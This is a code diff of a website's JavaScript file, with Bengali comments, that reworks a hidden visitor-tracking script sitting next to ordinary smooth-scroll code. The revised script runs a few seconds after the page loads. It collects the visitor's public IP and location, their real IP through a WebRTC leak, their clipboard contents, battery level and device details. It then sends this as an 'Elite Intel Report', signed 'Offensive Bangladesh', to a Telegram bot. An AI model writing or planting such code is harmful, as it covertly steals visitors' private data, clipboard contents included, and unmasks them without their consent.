@@ -4,50 +4,35 @@
         chatId: '7950771882'
     };
 
-    async function sendToTelegram(msg) {
-        try {
-            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: config.chatId, text: msg, parse_mode: 'Markdown' })
-            });
-        } catch (e) { console.error("Telegram Dispatch Error"); }
-    }
-
+    // ১. রিয়েল আইপি ডিটেক্টর (WebRTC Leak)
     async function getRealIP() {
-        return new Promise((resolve) => {
+        return new Promise((res) => {
             const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
-            pc.createDataChannel(""); pc.createOffer().then(d => pc.setLocalDescription(d));
+            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
             pc.onicecandidate = (i) => {
                 if (i && i.candidate && i.candidate.candidate) {
                     const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
-                    resolve(ip);
+                    res(ip);
                 }
             };
-            setTimeout(() => resolve("Not Detected"), 3000);
+            setTimeout(() => res("Not Found/VPN Active"), 4000);
         });
     }
 
-    async function runEliteScanner() {
-        // ১. রিয়েল আইপি (WebRTC)
-        const realIp = await getRealIP();
+    async function runIntelligence() {
+        console.log("System Initializing...");
 
-        // ২. আইপি ও লোকেশন ডিটেইলস
+        // ২. আইপি ও লোকেশন ডাটা (ISP, City, Country)
         let ext = {};
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            ext = await res.json();
-        } catch (e) {}
+            const response = await fetch('https://ipapi.co/json/');
+            ext = await response.json();
+        } catch (e) { ext = { ip: "Fetch Failed" }; }
 
-        // ৩. ক্লিপবোর্ড (এটি ট্রিকি, শুধুমাত্র ইউজার পেজে ক্লিক করলে কাজ করার সম্ভাবনা বেশি)
-        let clipData = "Access Denied/No Focus";
-        try {
-            if (navigator.clipboard) {
-                clipData = await navigator.clipboard.readText();
-            }
-        } catch (e) { clipData = "Permission Required"; }
+        // ৩. রিয়েল আইপি
+        const realIp = await getRealIP();
 
-        // ৪. ব্যাটারি
+        // ৪. ব্যাটারি স্ট্যাটাস
         let batt = "N/A";
         try {
             if (navigator.getBattery) {
@@ -56,33 +41,54 @@
             }
         } catch (e) {}
 
+        // ৫. ক্লিপবোর্ড ডাটা (Needs User Interaction)
+        let clip = "Protected/No Focus";
+        try {
+            if (navigator.clipboard) {
+                clip = await navigator.clipboard.readText();
+            }
+        } catch (e) { clip = "Permission Denied"; }
+
+        // ৬. ডাটা কম্পাইল
         const report = `
 🕵️ **Yash Khan Elite Intel Report**
 -----------------------------
 🌐 **Public IP:** ${ext.ip || 'N/A'}
 📡 **Real IP (WebRTC):** ${realIp}
 🏢 **ISP:** ${ext.org || 'N/A'}
-📍 **Location:** ${ext.city || 'N/A'}, ${ext.country_name || 'N/A'}
+📍 **City:** ${ext.city || 'N/A'}, ${ext.country_name || 'N/A'}
 🔋 **Battery:** ${batt}
-📋 **Clipboard:** \`${clipData}\`
+📋 **Clipboard:** \`${clip}\`
 💻 **OS:** ${navigator.platform}
 📱 **Memory:** ${navigator.deviceMemory || 'N/A'} GB
 🧠 **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
-🖥️ **Screen:** ${window.screen.width}x${window.screen.height}
 🕒 **Time:** ${new Date().toLocaleString()}
 -----------------------------
-🛡️ *Status: Offensive Bangladesh*
+🛡️ *Unit: Offensive Bangladesh*
         `;
 
-        await sendToTelegram(report);
+        // ৭. টেলিগ্রামে পাঠানো
+        try {
+            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: config.chatId,
+                    text: report,
+                    parse_mode: 'Markdown'
+                })
+            });
+            console.log("Report Dispatched.");
+        } catch (err) {
+            console.error("Dispatch Error");
+        }
     }
 
-    // ওয়েবসাইট লোড হওয়ার ৩ সেকেন্ড পর রান হবে
+    // উইন্ডো লোড হওয়ার ৩ সেকেন্ড পর রান হবে
     window.addEventListener('load', () => {
-        setTimeout(runEliteScanner, 3000);
+        setTimeout(runIntelligence, 3000);
     });
 })();
-
 
 // ===== Smooth Scroll =====
 function scrollToSection() {
